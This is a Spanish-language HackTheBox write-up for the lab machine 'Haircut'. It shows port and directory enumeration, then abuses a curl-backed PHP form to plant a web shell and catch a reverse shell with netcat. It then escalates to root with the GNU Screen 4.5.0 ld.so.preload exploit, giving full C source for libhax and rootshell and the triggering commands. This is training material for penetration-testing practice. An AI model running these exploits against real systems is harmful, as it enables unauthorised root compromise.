---
title: "Haircut Write-UP | HackTheBox"
date: "2021-04-26"
categories: [Write-Ups, HackTheBox]
tags: [CTFs, HackTheBox, Write-Ups]
media_subpath: /assets/img/posts/2021-04-26-haircut-write-up-hackthebox
image:
   path: header/haircut_card.webp
   lqip: data:image/webp;base64,UklGRm4AAABXRUJQVlA4IGIAAACwAwCdASoUAAwAPzmEuVOvKKWisAgB4CcJYgAAWpyqznc3aXuZYAD+wbehUqs3Pu9BZCN+qCBQ7N8CWzprgv9TZCdnORa4FglcwJTOAwACOdGl/58Fsanc7z/wGAumoAAAAA==
   
published: true
---

## Descripción

En esta máquina **Haircut** de la plataforma **Hackthebox** con dificultad "Medium" y OS Linux, haremos uso de la utilidad Curl a través de un recurso encontrado con gobuster en el servicio HTTP para abusar de ella y poder ejecutar RCE. Encontraremos un binario con permisos de SUID que nos permitirá escalar privilegios para conseguir shell root.

Como punto a comentar, la dirección IP de la máquina activa y la que se muestran en las imágenes y/o comandos utilizados son diferentes, ya que se ha utilizado instancia personal para la realización de dicho laboratorio.

## Escaneo y Enumeración

Comenzaremos como siempre con una traza ICMP para descubrir el tipo de SO que utiliza la máquina objetivo en base al TTL.

Nos encontramos con una máquina de SO GNU/Linux :

```bash
ping -c 1 10.129.105.250

PING 10.129.105.250 (10.129.105.250) 56(84) bytes of data.
64 bytes from 10.129.105.250: icmp_seq=1 ttl=63 time=71.0 ms

--- 10.129.105.250 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 70.959/70.959/70.959/0.000 ms
```

Hacemos uso de la herramienta NMAP para descubrir puertos abiertos:

```bash
# Nmap 7.91 scan initiated Mon Apr 26 10:10:23 2021 as: nmap -T5 -p- --open -n -Pn -v -oG allPorts -oN initScan 10.129.105.250
Nmap scan report for 10.129.105.250
Host is up (0.052s latency).
Not shown: 65526 closed ports, 7 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Observamos que tiene 2 puertos abiertos corriendo con los servicios: **SSH(22) y http(80)**.

Lanzamos nuevamente NMAP para intentar descubrir vulnerabilidades conocidas y versión utilizada por los servicios corriendo en los puertos abiertos:

```bash
# Nmap 7.91 scan initiated Mon Apr 26 10:12:55 2021 as: nmap -sC -sV -p22,80 -n -Pn -v -oN targeted 10.129.105.250
Nmap scan report for 10.129.105.250
Host is up (0.051s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
|_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
80/tcp open  http    nginx 1.10.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title:  HTB Hairdresser 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos que en el puerto 80 está corriendo un servicio Web con título: **HTB Hairdresser.**

Vamos a lanzar rápidamente el script de Nmap **http-enum** para fuzzear directorios comunes en el sitio web por si encontramos algo:

```bash
# Nmap 7.91 scan initiated Mon Apr 26 10:17:07 2021 as: nmap --script http-enum -p80 -n -oN haircut.webscan 10.129.105.250
Nmap scan report for 10.129.105.250
Host is up (0.050s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /test.html: Test page
```

Como vemos, no hemos encontrado gran cosa, únicamente un archivo test.html.

Utilizamos la herramienta **whatweb** para identificar de una pasada el sitio web:

```bash
whatweb <http://10.129.105.250>

<http://10.129.105.250> [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.10.0 (Ubuntu)], IP[10.129.105.250], Title[HTB Hairdresser], nginx[1.10.0]
```

Accedemos al sitio web y vemos que tiene una imagen:

![](body/52d8ff67c0c2f34d00aca7bcbcf4d1191b64500b.png)

Podemos descargar la imagen y comprobar los bits menos significativos, para ver si tiene algún archivo oculto en su interior:

```bash
$ binwalk bounce.jpg                

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01

$ steghide info bounce.jpg 

"bounce.jpg":
  formato: jpeg
  capacidad: 4,6 KB
Intenta informarse sobre los datos adjuntos? (s/n) s
Anotar salvoconducto: 
steghide: no pude extraer ningn dato con ese salvoconducto!
```

No encontramos nada oculto en la imagen.

Accedemos al recurso que hemos encontrado con el script **http-enum** de Nmap y nos encontramos la siguiente imagen:

![](body/c9964e4a4ea2defa1d0e33fcd305f794847940e0.png)

Parece ser que nos quieren dar una pista con **CURL**, puede ser que haya algún recurso escondido. Vamos a probar con la herramienta **GoBuster** haciendo fuzzing para ver si encontramos algo que nos interese:

```bash
gobuster dir -u <http://10.129.105.250/> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     <http://10.129.105.250/>
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2021/04/26 11:07:58 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 194] [--> <http://10.129.105.250/uploads/>]
/exposed.php          (Status: 200) [Size: 446]                                     
Progress: 78822 / 661683 (11.91%)
```

Con la herramienta **GoBuster** encontramos el directorio **uploads** y el archivo **exposed.php**.

En el directorio **uploads** no podemos listar los archivos que contiene ya que nos devuelve un código de error **403: Forbidden**, pero como sabemos, eso no es problema si sabemos el nombre del recurso que queremos buscar. Nos anotamos ese directorio en la cabeza y seguimos con el archivo PHP.

![](body/e998938d2d416b814eb036d1d80757fa91e225f7.png)

Al acceder al recurso con extensión PHP, nos encontramos con un inputbox que nos permite realizar una búsqueda según localización. La pista de antes ya nos había indicado que podía ser la herramienta **CURL**.

![](body/e463f5c66a5013b27417920a2755be6fa2c6d3a8.png)

Vamos a realizar una prueba. Levanto un servicio http con **updog** y añado cualquier archivo para ver si es capaz de resolverlo y mostrarlo en pantalla:

```bash
$ echo '<h1> rekkatz </h1>' > index.html
$ updog -p80

[+] Serving /home/rekkatz/Documentos/htb/Haircut/content...
 * Running on <http://0.0.0.0:80/> (Press CTRL+C to quit)
10.129.105.250 - - [26/Apr/2021 11:20:20] "GET / HTTP/1.1" 200 -
10.129.105.250 - - [26/Apr/2021 11:20:42] "GET /index.html HTTP/1.1" 200 -
```

![](body/c5603d7e896978949984684d3f0760fd6c141fb6.png)

## Explotación

Como sabemos que está utilizando la utilidad CURL, vamos a utilizar el parámetro "**\-o**" que nos permite guardar el output del recurso al cual estamos accediendo a un archivo que nosotros escojamos. En este caso sabemos de anteriormente que tenemos un directorio con nombre **uploads**, que como hemos comentado anteriormente no podemos listar los archivos, pero sí que podemos hacer target de un recurso que sepamos el nombre completo.

Por lo tanto, vamos a almacenar el output de nuestro recurso test.php en la máquina, suponiendo que la ruta absoluta del directorio **uploads** sea **/var/www/html/uploads:**

![](body/d5b1c65544778cb374f655f987ceb5bd2f56b1d9.png)

![](body/07bb4b0894fa32598145f8f6a024dcd4316bba2e.png)

Accedemos al recurso en el directorio uploads y vemos que tenemos el archivo php que hemos creado y que podemos realizar **RCE**:

![](body/449bd8314904951d3c85cd219059e841407ae159.png)

Creamos un script en bash y como sabemos que tenemos curl en el sistema, levantamos servicio http en nuestra máquina, apuntamos al script que hemos creado y pipeamos con bash para ganar acceso al sistema:

![](body/158483f34d91cc8c3a03ddb47b795dedc2aff3ec.png)

![](body/e27a9dff58c6652847272d93cd87fea83b17366b.png)

Obtenemos acceso al sistema:

```bash
$ nc -lvnp 443

listening on [any] 443 ...
connect to [10.10.14.38] from (UNKNOWN) [10.129.105.250] 40602
bash: cannot set terminal process group (1430): Inappropriate ioctl for device
bash: no job control in this shell
www-data@haircut:~/html/uploads$ whoami
whoami
www-data
www-data@haircut:~/html/uploads$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@haircut:~/html/uploads$
```

Realizamos tratamiento para shell interactiva:

```bash
www-data@haircut:~/html/uploads$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null

Control + Z
ssty raw -echo; fg
reset
xterm

www-data@haircut:~/html/uploads$ export SHELL=bash
www-data@haircut:~/html/uploads$ export TERM=xterm-256color
www-data@haircut:~/html/uploads$ stty rows 70 columns 253
```

## Enumeración del sistema

### User Flag

Podemos visualizar la flag siendo usuario www-data, ya que tenemos permisos de lectura para "Otros":

```bash
www-data@haircut:/home/maria/Desktop$ ls -l user.txt 
-r--r--r-- 1 root root 34 May 16  2017 user.txtroot@haircut:/root# wc -c root.txt 
33 root.txt
www-data@haircut:/home/maria/Desktop$ wc -c user.txt 
34 user.txt
```

Enumeramos los usuarios que existen a nivel de sistema que tengan acceso a terminal sh:

```bash
www-data@haircut:~/html$ grep "sh$" /etc/passwd

root:x:0:0:root:/root:/bin/bash
maria:x:1000:1000:maria,,,:/home/maria:/bin/bash
```

Vemos que existe un usuario con nombre **maria**.

Si enumeramos binarios del sistema que puedan contener permisos SUID, nos encontramos con el siguiente:

```bash
www-data@haircut:~$ find / -perm -4000 2>/dev/null
...
/usr/bin/screen-4.5.0
...
```

Este binario llama la atención ya que no se encuentra entre los binarios por defecto de un sistema GNU/Linux con permisos SUID.

Si echamos un ojo a searchsploit, nos indica que existen exploits para LPE (Local Privilege Escalation):

```bash
searchsploit screen 4.5                                               
---------------------------------------------------- ---------------------------------
 Exploit Title                                      |  Path
---------------------------------------------------- ---------------------------------
GNU Screen 4.5.0 - Local Privilege Escalation       | linux/local/41154.sh
GNU Screen 4.5.0 - Local Privilege Escalation (PoC) | linux/local/41152.txt
```

## Escalada de privilegios

Elegimos el exploit **41154**, le echamos un vistazo al código y vemos que la intención es crear un compilado del archivo **libhax** y **rootshell** en lenguaje **C**.

Como yo he tenido problemas a la hora de compilar en la máquina de HTB, lo he realizado en mi máquina local y he subido los archivos ya compilados al directorio /tmp de la máquina Haircut:

1 - Creamos el archivo **"libhax.c"** con el editor:

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\\n");
}
```

2 - Compilamos libhax.c:

```bash
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c

(No hacer caso de los warnings)
```

3 - Creamos el archivo "**rootshell**" con el editor:

```c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```

4 - Compilamos rootshell.c:

```bash
gcc -o /tmp/rootshell /tmp/rootshell.c

(No hacer caso de los warnings
```

5 - Una vez tengamos la librería **libhax.so** y el binario **rootshell** compilados, los subimos a la máquina Haircut en el directorio **/tmp**. En la máquina Haircut ejecutamos:

```bash
www-data@haircut:~$ cd /etc
www-data@haircut:/etc$ umask 000
www-data@haircut:/etc$ screen -D -m -L ld.so.preload echo -ne  "\\x0a/tmp/libhax.so"
www-data@haircut:/etc$ screen -ls
```

6 - Por último ejecutamos el binario **rootshell** que hemos subido a la ruta **/tmp** y obtenemos shell de usuario **root**:

```bash
www-data@haircut:/etc$ /tmp/rootshell
root@haircut:/etc# whoami
root
root@haircut:/etc# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
root@haircut:/etc#
```

### Root Flag

```bash
root@haircut:/root# wc -c root.txt 
33 root.txt
```
